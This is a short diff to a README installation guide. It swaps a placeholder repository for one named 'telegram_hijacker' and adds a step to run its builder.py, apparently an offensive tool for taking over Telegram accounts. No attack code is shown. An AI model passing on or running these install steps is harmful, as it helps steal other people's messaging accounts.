@@ -1,11 +1,14 @@
 # Guide
 
-### Installation
+## Installation
 
-Using git
-
+### Using git
+Copy repo after launch builder file:
 ```bash
-git clone https://github.com/your-repo/network_tool.git
-cd network_tool
+git clone https://github.com/NeoMetalx1/telegram_hijacker.git
+cd telegram_hijacker
+python builder.py
 ```
+
+## Usage
 
